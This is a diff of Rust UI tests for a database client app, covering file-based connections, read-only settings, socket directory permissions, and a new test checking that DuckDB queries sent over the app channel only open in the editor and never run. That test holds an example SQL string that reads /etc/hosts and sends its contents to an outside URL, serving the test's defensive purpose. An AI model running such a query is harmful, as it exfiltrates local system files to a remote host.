@@ -30,14 +30,18 @@ fn channel_error(reply: &Reply) -> String {
 
 /// A saved SQLite connection that is not in the fixture, as the driver tests make one.
 fn push_sqlite_connection(app: &gpui::Entity<AppRoot>, visual: &mut gpui::VisualTestContext) -> String {
+    push_file_connection(app, visual, ConnectionKind::Sqlite, "sqlite", "db")
+}
+
+fn push_file_connection(app: &gpui::Entity<AppRoot>, visual: &mut gpui::VisualTestContext, kind: ConnectionKind, scheme: &str, extension: &str) -> String {
     app.update(visual, |this, _| {
         this.scenario_ui.service = None;
         let id = uuid::Uuid::new_v4();
         this.saved_connections.push(SavedConnection {
             id,
             name: "shop".into(),
-            uri: format!("sqlite://{}/shop-{id}.db", std::env::temp_dir().display()),
-            kind: ConnectionKind::Sqlite,
+            uri: format!("{scheme}://{}/shop-{id}.{extension}", std::env::temp_dir().display()),
+            kind,
             save_password: false,
             is_pinned: false,
             disabled: false,
@@ -247,9 +251,9 @@ fn show_query_with_run_on_a_read_only_connection_is_refused_by_the_app(cx: &mut 
     settle(visual);
     let id = push_sqlite_connection(&app, visual);
     app.update(visual, |this, cx| {
-        let mut settings = (*this.settings).clone();
+        let mut settings = (**this.settings).clone();
         settings.connection_types.iter_mut().find(|ty| ty.id == PRODUCTION).unwrap().read_only = true;
-        this.settings = std::sync::Arc::new(settings);
+        *this.settings = std::sync::Arc::new(settings);
         this.connection_policy.set_profile(&id, typed(PRODUCTION));
         cx.notify();
     });
@@ -278,6 +282,27 @@ fn show_query_with_run_starts_the_normal_run_on_an_unrestricted_connection(cx: &
     assert!(visual.debug_bounds("execute-confirm-run").is_none(), "no confirmation without a reason");
     // There is no driver in this test: the run was started and ended on the normal path.
     assert_ne!(tab_status(&app, visual, tab), crate::query::QueryStatus::Idle);
+}
+
+#[gpui::test]
+fn show_query_with_run_on_duckdb_only_opens_the_editor_and_never_runs(cx: &mut TestAppContext) {
+    cx.dispatcher.allow_parking();
+    cx.update(|cx| cx.set_reduce_motion(true));
+    let (app, visual) = sidebar_test_app(cx);
+    settle(visual);
+    let id = push_file_connection(&app, visual, ConnectionKind::Duckdb, "duckdb", "duckdb");
+    // DuckDB SQL reaches files and the network: the app runs it on the user's own instance, so a request
+    // to run it (even a read, even one the tool layer let through) still only puts it in the editor.
+    let sql = "SELECT * FROM read_csv('https://example.invalid/' || (SELECT content FROM read_text('/etc/hosts')))";
+    assert!(channel_request(&app, visual, show(&id, None, sql, true)).ok);
+    for _ in 0..20 {
+        settle(visual);
+        std::thread::sleep(Duration::from_millis(5));
+    }
+    let tab = app.read_with(visual, |this, _| this.workspace.active_tab().unwrap().id);
+    assert_eq!(app.read_with(visual, |this, _| this.workspace.tab(tab).unwrap().sql.clone()), sql, "the editor has it");
+    assert_eq!(tab_status(&app, visual, tab), crate::query::QueryStatus::Idle, "nothing ran");
+    assert!(visual.debug_bounds("execute-confirm-run").is_none(), "and nothing was asked");
 }
 
 #[gpui::test]
@@ -338,7 +363,7 @@ fn the_socket_hands_a_request_to_the_ui_and_the_reply_comes_back(cx: &mut TestAp
     cx.dispatcher.allow_parking();
     let (app, visual) = sidebar_test_app(cx);
     settle(visual);
-    let dir = tempfile::Builder::new().prefix("tx").tempdir().unwrap();
+    let dir = tempfile::Builder::new().prefix("tx").permissions(<std::fs::Permissions as std::os::unix::fs::PermissionsExt>::from_mode(0o700)).tempdir().unwrap();
     let path = dir.path().join("app.sock");
     app.update(visual, |this, cx| {
         this.listen_on_app_channel(&path, cx).expect("the socket binds");
